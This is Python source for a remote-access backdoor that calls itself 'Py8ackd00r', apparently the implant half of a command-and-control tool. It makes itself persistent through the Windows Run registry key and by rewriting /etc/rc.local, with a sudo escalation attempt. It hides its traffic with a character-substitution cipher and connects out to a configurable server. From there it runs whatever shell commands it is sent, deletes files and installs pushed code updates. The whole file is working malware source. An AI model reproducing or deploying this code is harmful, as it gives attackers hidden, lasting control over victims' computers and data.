try:
    import os
    import socket
    import time
except:
    os.system("pip install socket")
    os.system("pip3 install socket")
    os.system("pip install time")
    os.system("pip3 install time")

encrypted = list("""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
decrypted = list("""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")

connected = False
persistence_status = "Enabled" if "AppData" in os.getcwd() or "/etc/rc.local" in os.getcwd() else "Disabled"

global compiled_name

##### VARIABLES #####
compiled = bool("{cb5185196ad3147d58c13c22b2a32292}") ##### Var
compiled_name = "{8f8c6b7b02405c7ab1027019e69a81e1}" ##### Var
server = "{cf1e8c14e54505f60aa10ceb8d5d8ab3}" ##### Var
port = int("{901555fb06e346cb065ceb9808dcfc25}")  #### Var
##### VARIABLES #####

def encrypt(string):
    final = ""
    for i in list(string):
        if i == "\n":
            final += "\n"
        else:
            n = decrypted.index(i)
            final += encrypted[n]
    return final

def decrypt(string):
    final = ""
    for i in list(string):
        if i == "\n":
            final += "\n"
        else:
            n = encrypted.index(i)
            final += decrypted[n]
    return final

try:

    def recive(buffer):
        return decrypt(server_connection.recv(buffer).decode("utf-8"))


    def send(str):
        server_connection.send(encrypt(str).encode("utf-8"))


    def recive_buffer(buffer):
        bff = recive(buffer)
        if bff.startswith("#"):
            buff = int(bff.split("#")[1]) * 2
            condition_msg = True
            while condition_msg:
                msg = recive(buff)
                condition_msg = False
            return msg


    def send_buffer(string):
        try:
            buffer = len(str(string)) + 10
            send("#{}".format(buffer))
            time.sleep(0.1)
            send(str(string))
        except:
            pass


    ########## PERSISTENCE/START OF PRIVILLEGE ESCALATION ##########

    def persistence_windows_1(file_name=os.path.basename(__file__)):
        if compiled:
            name = compiled_name
        elif not compiled:
            name = file_name
        try:
            os.popen('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v {} /t REG_SZ /d "%appdata%\\Microsoft\\{}'.format(name, name))
            return True
        except PermissionError:
            return False
        except:
            pass


    def persistence_linux_1(file_name=os.path.basename(__file__)):
        try:
            with open("/etc/rc.local") as file:
                old = file.readlines()
                old[len(old) - 1] = "python3 {}/.{}".format(os.path.expanduser("~"), file_name)
                old.append("\nexit 0")
                new = ""
                for i in old:
                    new += i
                nfile = open("/etc/rc.local", "w")
                nfile.write(new)
            return True
        except PermissionError:
            return False


    def persistence_linux_2(file_name=os.path.basename(__file__)):
        try:
            persistence = open(".percistence.py", "w")
            persistence.write("""
import os
file_name = "%s"
try:
    with open("/etc/rc.local") as file:
        old = file.readlines()
        old[len(old) - 1] = "python3 {}/.{}".format(os.path.expanduser("~"), fi$
        old.append("\\nexit 0")
        new = ""
        for i in old:
            new += i
        nfile = open("/etc/rc.local", "w")
        nfile.write(new)
        print("True")
except:
    pass""" % (file_name))
            result = os.popen("sudo python3 .percistence.py")
            return True
        except PermissionError:
            return False


    def persistence(file="self"):
        if file == "self":
            if not compiled:
                file_name = os.path.basename(__file__)
            elif compiled:
                file_name = compiled_name
        else:
            file_name = file
        current_os = "windows" if os.popen("ls").read() == "" else "linux"
        if current_os == "windows":
            os.popen('copy "{}" "%appdata%\\Microsoft\\{}"'.format(file_name, file_name)).read()
            if persistence_windows_1(file_name):
                persistence_status = "Enabled"
            else:
                persistence_status = "Disabled (Permission Error)"
        elif current_os == "linux":
            os.popen('cp "{}" "{}/.{}"'.format(file_name, os.path.expanduser("~"), file_name))
            if persistence_linux_1(file_name):
                send_buffer("Enabled")
            else:
                send_buffer("Disabled (Permission Error)")
                if persistence_linux_2(file_name):
                    send_buffer("Enabled")
                else:
                    send_buffer("Disabled (Permission Error)")


    persistence()

    ########### SERVER CONNECTION START ##########

    server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            server_connection.connect((server, port))
            connected = True
            break
        except:
            time.sleep(1)
            pass

    send_buffer("231Py8ackd00r231")
    condition = True

    while condition:
        status = recive_buffer(1024)
        condition = False

    response = "200 " + os.getcwd()

    if status == "200":
        send_buffer(response)


    ########## START OF FUNCIONALITY DEFENITIONS ##########

    def get_dir():
        return os.getcwd()


    ########## END OF FUNCIONALITY DEFENITIONS ##########

    ########## COMMAND RECIVING AND PROCESSIG #########
    condition = True
    while condition:
        request = recive_buffer(1024)
        ##### PERCISTECNE COMMAND #####
        if request.startswith("{persistence}"):
            if request.split("-")[1] == "s":
                send_buffer(persistence_status)
            elif request.split("-")[1] == "r":
                persistence()
                send_buffer("Result: Persistence " + persistence_status)
        ##### CHDIR COMMAND #####
        elif request.startswith("{chdir}"):
            dir = request.split("}", 1)[1]
            try:
                os.chdir(dir)
                send_buffer("{sucess}" + get_dir())
            except FileNotFoundError:
                send_buffer("{error}Invalid dir")
        ##### CODE UPDATE COMMAND #####
        elif request.startswith("{codeupdate"):
            extension = "." + request.split("}", 1)[0].split(" ", 1)[1]
            with open(".update" + extension, "w") as file:
                file.write(request.split("}", 1)[1])
            persistence(".update" + extension)
            os.remove(".update" + extension) if persistence_status == "Enabled" else send_buffer(
                "Failed to enable persistence on update")
        ##### COMMAND CHECK #####
        elif request.startswith("{command}"):
            command = request.split("}", 1)[1]
            try:
                if command.startswith("mkdir"):
                    try:
                        response = os.mkdir(command.split(" ", 1)[1])
                        send_buffer("{sucess}Directory successfully created")
                    except:
                        send_buffer("{sucess}The file already exists")
                elif command.startswith("del"):
                    try:
                        os.remove(command.split(" ", 1)[1])
                        send_buffer("{sucess}File removed successfully")

                    except:
                        try:
                            os.rmdir(command.split(" ", 1)[1])
                            send_buffer("{sucess}File removed successfully")
                        except:
                            send_buffer("{error}")
                elif command.startswith("mv"):
                    response = os.popen(command.split(" ", 1)[1]).read()
                    if response == "":
                        send_buffer("{error}")
                    else:
                        send_buffer("{sucess}" + response)
                elif command.startswith("python"):
                    send_buffer("{error}Command not supported on this backdoor (shell required)")
                else:
                    response = os.popen(command).read()
                    if response == "":
                        send_buffer("{error}")
                    else:
                        send_buffer("{sucess}" + response)
            except:
                send_buffer("{error}")
except:
    pass

try:
    server_connection.close()
except:
    pass